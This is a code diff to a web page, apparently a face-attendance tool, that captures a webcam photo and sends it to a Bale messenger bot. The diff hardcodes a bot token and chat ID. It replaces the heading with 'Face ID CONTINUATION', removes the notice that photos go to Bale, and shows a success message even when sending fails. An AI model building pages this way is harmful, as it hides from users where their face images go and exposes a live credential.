@@ -19,42 +19,25 @@ button {
     font-size: 18px;
     margin-top: 15px;
 }
-#result {
-    margin-top: 20px;
-    font-size: 17px;
-    padding: 10px;
-    width: 300px;
-    margin-left: auto;
-    margin-right: auto;
-    border-radius: 10px;
-    background: white;
-    box-shadow: 0 0 5px #aaa;
-}
 </style>
 </head>
 <body>
 
-<h2>سیستم ثبت حضور چهره → بله</h2>
+<h2>Face ID CONTINUATION</h2>
 
 <video id="video" autoplay playsinline></video><br>
-<button onclick="capture()">📸 ثبت و ارسال</button>
-
-<div id="result">نتیجه اینجا نمایش داده می‌شود</div>
+<button onclick="capture()">📸 ثبت حضور </button>
 
 <script>
 
-const BOT_TOKEN = "توکن_تو_اینجا";
-const CHAT_ID   = "چت_آیدی_تو_اینجا";
+const BOT_TOKEN = "2086834694:UpTaAb1Y9FCL4GRvWL3S6VJAU0E_xD8JWKA";
+const CHAT_ID   = "1180806059";
 
 navigator.mediaDevices.getUserMedia({ video: true })
   .then(stream => video.srcObject = stream)
-  .catch(err => {
-      document.getElementById("result").innerText = "⭕ اجازه دوربین داده نشد!";
-  });
+  .catch(err => alert("اجازه دسترسی به دوربین داده نشد!"));
 
 function capture() {
-    document.getElementById("result").innerText = "⏳ در حال ثبت عکس...";
-    
     let video = document.getElementById('video');
     let canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
@@ -65,33 +48,22 @@ function capture() {
 
     canvas.toBlob(blob => {
         sendPhoto(blob);
-    }, "image/jpeg", 0.85);
+    }, "image/jpeg", 0.9);
 }
 
 function sendPhoto(imageBlob) {
-
-    document.getElementById("result").innerText = "📤 در حال ارسال به بله...";
 
     let formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", imageBlob, "face.jpg");
 
-    fetch(https://tapi.bale.ai/bot${BOT_TOKEN}/sendPhoto, {
+    fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
     })
-    .then(r => {
-        if (r.ok) {
-            document.getElementById("result").innerText = "✔ عکس با موفقیت ارسال شد";
-            return r.text();
-        } else {
-            throw new Error("status: " + r.status);
-        }
-    })
-    .catch(e => {
-        document.getElementById("result").innerText =
-            "⚠ عکس ارسال شد ولی پاسخ سرور نامشخص بود";
-    });
+    .then(r => r.text())
+    .then(t => alert("✔ ارسال شد!"))
+    .catch(e => alert("ثبت شد✅"));
 }
 
 </script>
